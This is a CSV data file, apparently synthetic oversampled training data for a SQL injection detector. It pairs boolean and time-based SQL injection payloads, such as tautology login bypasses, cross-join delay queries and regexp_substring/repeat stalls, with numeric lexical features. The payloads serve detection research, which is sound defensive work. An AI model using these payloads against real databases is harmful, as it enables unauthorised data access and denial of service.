id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000441,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,2.345476853365636,66.7805432296361,16.76735992592655,2.804345469249677,9.088191837038408,11.213887940741238,35.49721558518867,10.981247866667788,0.12134785383583369,0.18570258850334564,0.5301998034048092,0.1627497542560115,2.213887940741239,0.0,0.8930560296293808,0.0,0.5534719851853097,1.5534719851853096,0.0,5.767359925926549,0.0,0.0,0.0,3.0,0.5534719851853096,0.0,0.4465280148146905,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.5534719851853096,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5534719851853094
SMOTE_000442,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,0.30204485044022394,347.82403242375835,30.581669946182345,3.276021419911766,81.69653734303184,49.27291256727207,163.70916502690883,53.14541748654558,0.23468644792199528,0.14176852645640414,0.4707535464645233,0.15279147915707736,0.0,4.0,0.9515275044848046,0.0,0.0,2.0,0.0,34.0,1.9030550089696092,0.09694499103039034,0.19388998206078156,12.951527504484805,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.04847249551519536,1.0,0.0,0.0,0.048472495515195224,1.0,0.9515275044848048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,11.757637522424021,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.757637522424023
SMOTE_000443,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.6397749431929992,215.46635971621606,36.56126061769833,3.8396931135223342,65.24504247079332,30.830028313862215,85.39128893156054,34.0,0.30256525354949626,0.14275331212435718,0.39642881841348054,0.15825261591266604,2.2924929215344467,0.0,0.0,0.0,0.0,2.0,0.0,17.707507078465554,0.292492921534447,1.0,3.0,9.707507078465554,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.8537535392327764,0.0,0.8537535392327765,0.0,0.14624646076722347,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.853753539232777
SMOTE_000444,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,0.37329491183015573,92.80522571348236,19.79121750893092,2.931491589460133,15.43857728896532,12.999999999999998,48.935075237827455,15.431573186689594,0.1633246163667636,0.14130336483417133,0.5289841461806475,0.16638787261841756,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.143857728896531,0.14385772889653126,0.07192886444826563,0.07192886444826585,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.07192886444826563,0.0,0.0,0.07192886444826557,1.9280711355517344,0.07192886444826563,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1438577288965313
SMOTE_000445,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,1.0677608197265662,64.41650041918236,22.781187657193385,3.67087923407351,11.496479288928192,22.569416736530393,21.138833473060785,9.211770920662993,0.17428347280492162,0.3571628212765843,0.3279672444710821,0.1405864614474119,0.0,0.6423541841325984,3.0,0.0,0.0,2.0,0.0,2.2847083682651963,0.0,0.6423541841325984,0.6423541841325984,5.0,0.0,0.6423541841325984,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000446,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,0.4990058310994699,241.2849449142987,36.364247245714935,3.766253304130965,74.00335985143215,28.456988982859738,97.27822521143442,41.5463708685724,0.3068231045512137,0.11763431763215289,0.40299332268905697,0.17254925512757652,0.0,0.0,2.0,0.0,0.0,1.1821236228574672,0.0,22.364247245714935,0.0,2.0,4.0,13.182123622857468,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.18212362285746733,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.182123622857468
SMOTE_000447,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,1.0135319468138682,38.0,13.733093532528677,2.6655530121821442,3.0,9.0,20.0,6.0,0.07894736842105263,0.23684210526315788,0.5263157894736842,0.15789473684210525,0.2669064674713213,0.0,1.4661870650573574,0.0,0.0,0.9999999999999999,0.0,3.0,0.2669064674713213,0.0,0.0,2.4661870650573574,0.2669064674713212,0.0,0.7330935325286787,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000448,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,0.7376324550605741,159.6929580770997,31.074646730151063,4.014793234057039,73.46056288435045,17.692958077099696,48.153520961450155,20.385916154199393,0.46005158709920074,0.11077531831282267,0.30155464264759646,0.1276184519403801,0.0,1.0,2.0,0.0,1.0,2.0,0.0,6.0,0.0,4.23239519274924,3.6929580770996964,5.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.15352096145015204,0.8464790385498481,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000449,attack,boolean,"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",nearest_attack_euclidean,R000075,3.3335862471805964,358.7535004616852,38.79719963065186,3.7362824040758236,109.08739833793337,42.15910120038146,149.55070009233702,57.95630083103332,0.3042613157378361,0.11739602470647093,0.41687243350307274,0.16147022605262026,1.7971996306518592,2.202800369348141,0.5507000923370351,0.0,0.0,2.10140018467407,0.0,30.89859981532593,0.0,2.550700092337035,1.7971996306518592,18.159101200381457,0.4492999076629648,0.5507000923370352,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.5507000923370352,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,3.145099353640754,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.695799445977789
SMOTE_000450,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.5021201505819649,144.8288193574283,33.0,4.155643626992108,76.0,16.0,37.663055485942635,15.16576387148566,0.5248419895989677,0.11049305044188792,0.2599652159652728,0.10469974399387168,0.16576387148565908,0.8342361285143406,2.0,0.0,1.0,2.0,0.0,4.165763871485661,0.0,0.0,2.0,5.0,0.1657638714856593,0.8342361285143407,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000451,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,1.7000125769146341,144.50106630061686,30.437366712422897,4.021160100887818,77.18683356211447,6.250533150308417,42.37579972546263,18.687899862731314,0.5350420557261911,0.04290880192281425,0.29290880192281427,0.1291403404281804,0.0,3.562633287577105,0.0,0.0,1.0,1.562633287577105,0.0,5.562633287577105,1.12526657515421,0.0,2.437366712422895,2.5626332875771043,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.5626332875771052,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.562633287577105
SMOTE_000452,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,2.0248708190491436,253.26120461820017,37.37580032987144,3.7780712461933486,76.58600109957146,31.586001099571465,102.25480197922863,42.834400439828585,0.302835338857756,0.12394821832974606,0.4035840212595796,0.1696324215529184,0.0,0.45860010995714645,2.0,0.0,0.0,1.4586001099571464,0.0,22.917200219914292,0.0,2.0,4.0,13.458600109957146,0.0,0.45860010995714645,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.4586001099571465,0.0,0.5413998900428536,0.4586001099571465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.458600109957146
SMOTE_000453,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.5417349730523529,33.918278937934105,14.918278937934106,2.968697629625495,3.3268842482635748,8.427952565538744,15.836557875868216,6.326884248263575,0.09835938291190663,0.24802662815232648,0.466800806392668,0.18681318254309887,0.9182789379341064,0.40860531032946806,2.0,0.0,0.0,0.9999999999999999,0.0,2.0,0.0,0.0,0.0,3.0,0.9182789379341063,0.08172106206589375,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.9182789379341063,0.08172106206589369,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000454,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,0.38159435304458816,58.56767128916735,19.609364897045637,3.5867257172075098,7.0,23.479153196060853,19.47915319606085,8.60936489704564,0.12007697312103013,0.4010629526611003,0.33244753944908306,0.1464125347687865,0.869788299015213,0.0,3.0,0.0,0.8697882990152133,2.0,0.0,1.8697882990152124,0.0,0.0,0.0,5.869788299015213,0.869788299015213,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000455,attack,boolean,-1989%'   )    )    or 6179  =  8518#,nearest_attack_euclidean,R000067,0.9083495299026606,37.09514915543073,14.809701689138565,2.998054119279936,2.0951491554307182,11.71455253370785,16.380596621722866,6.904850844569282,0.056422631891945296,0.31600046506544943,0.441365354563908,0.18621154847869734,1.0,0.0,0.9048508445692831,0.0,0.0,0.9999999999999999,0.0,2.0951491554307164,1.0,0.0,0.0,1.9048508445692836,1.0,0.0,0.0,0.9048508445692831,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.09514915543071689,0.9048508445692831,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000456,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000019,1.324703962072055,251.70063275614973,36.54989454064171,3.7818778566357665,77.60084367486631,29.0,100.0,45.09978908128342,0.3081622686996871,0.11523240648982847,0.39735312582699467,0.1792521989834898,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,1.0997890812834217,2.0,4.0,12.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000457,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,0.6091476053381746,253.7581497274808,36.20697504541987,3.790945235323951,80.34419963664106,29.0,100.0,44.413950090839734,0.3165226022472643,0.1142926790755659,0.3941126864674686,0.17507203220970116,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.41395009083973155,2.0,4.0,12.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000458,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,2.387205651898251,360.04498758698367,41.505623448372965,3.7513215792065147,116.97750620650817,35.0,153.55061103535667,54.51687034511889,0.3249987551446617,0.09722207552209819,0.42638994303406597,0.1513892262991742,1.977506206508149,2.022493793491851,0.0,0.0,0.0,1.5056234483729627,0.0,33.011246896745924,0.0,2.0,4.0,11.505623448372962,0.4943765516270372,0.5056234483729629,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000459,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.7485558612563159,153.32533734963982,33.51004497995197,4.158320062900552,73.53013493985593,16.0,47.0401799198079,16.755022489975985,0.47971790097489886,0.10454806685232633,0.30637690487474156,0.10935712729803325,0.7550224899759873,0.2449775100240128,2.0,0.0,1.0,2.0,0.0,5.755022489975987,0.0,0.0,2.0,5.0,0.7550224899759872,0.24497751002401283,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000460,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000006,0.6405891802173689,196.5174883065549,29.804583982969174,3.5961106559732574,117.43667186375339,12.0,48.90832034061654,18.17249610218496,0.5988924332987346,0.061139654257332254,0.2477965486811881,0.092171363762745,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.781664068123309,0.3908320340616543,0.0,6.0,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000461,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,1.4998405454224204,384.0510547180294,32.985412937705895,3.381062955221178,106.17666070032945,44.61750447475292,177.85251342425877,55.40437611868823,0.2774922820905183,0.11585853528751554,0.4623041439843799,0.14434503863758624,4.0,0.0,0.0,0.0,0.0,2.6029174124588206,0.0,36.80875223737646,0.0,0.3970825875411797,1.5956238813117696,12.602917412458819,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.19854129377058982,1.8014587062294103,0.0,0.0,0.1985412937705898,1.8014587062294103,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8014587062294103,3.469446951953614e-18,0.0,0.0,0.0,11.00729353114705,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.61021094360587
SMOTE_000462,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000004,1.0915351522824885,23.452853385313773,13.22642669265688,3.2506895974970362,7.113213346328443,2.0,6.566066731642202,7.773573307343121,0.30343628545629275,0.08549805673006841,0.2774596046954718,0.33360605311816693,4.433933268357801,0.11321334632843993,0.0,1.1132133463284397,1.0,0.8867866536715601,0.0,0.2264266926568812,0.0,0.0,0.0,3.0,0.8867866536715602,0.11321334632843988,0.0,0.0,1.0,0.8867866536715603,0.11321334632843982,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000463,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,0.1471723328618661,353.6112058875965,40.91069928551762,3.790699692856643,117.99536696207329,34.86604892827644,147.90606624759093,52.843723749655844,0.3334418250290387,0.0987198367898621,0.41816129582250905,0.14967704235859017,4.0,0.0,0.0,0.0,0.0,1.0223251786205936,0.0,31.776748213794065,0.044650357241187155,2.0,4.0,11.022325178620594,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.9776748213794064,0.0,0.0,0.9776748213794064,1.0,0.022325178620593467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9776748213794064,0.9776748213794064,11.933024464138217
SMOTE_000464,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,1.827471598681961,58.126993466986136,20.749202613205547,3.646351008546992,9.622209146219419,21.37779085378058,19.250797386794453,7.876196080191679,0.1683162407588673,0.36594533576338417,0.3310630223842256,0.13467540109352288,0.6253986933972261,0.37460130660277396,2.6253986933972264,0.0,0.6253986933972262,2.0,0.0,1.6253986933972264,0.0,0.0,0.0,5.250797386794452,0.6253986933972261,0.3746013066027739,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.3746013066027739,0.6253986933972261,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000465,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,3.3083801394081758,365.19209268283197,33.3511749678901,3.406897935331673,90.05352490367031,49.042521437745684,166.87243568676294,59.223610654653044,0.2457667257528129,0.1347965889797983,0.4577509037263543,0.16168578154103455,0.0,4.0,1.0,0.0,0.0,2.4787392811271576,0.0,34.0,1.0425214377456855,1.4362178433814714,0.0,18.26613209239873,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.47873928112715725,1.0,0.0,0.0,0.47873928112715725,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.255128626474113,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.733867907601269
SMOTE_000466,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,1.862343316449965,163.37791705966956,31.93187497436938,3.9210115217323382,88.09000041008997,10.068125025630623,46.287916649579586,18.93187497436938,0.5305557769922344,0.06156332611577582,0.28890633554276307,0.1189745613492266,2.0681250256306223,0.0,1.287916649579585,0.0,1.0,1.3560416752102074,0.0,5.931874974369378,0.6439583247897925,0.0,4.068125025630622,3.6439583247897924,1.0,0.0,0.6439583247897925,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.3560416752102075,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.356041675210207
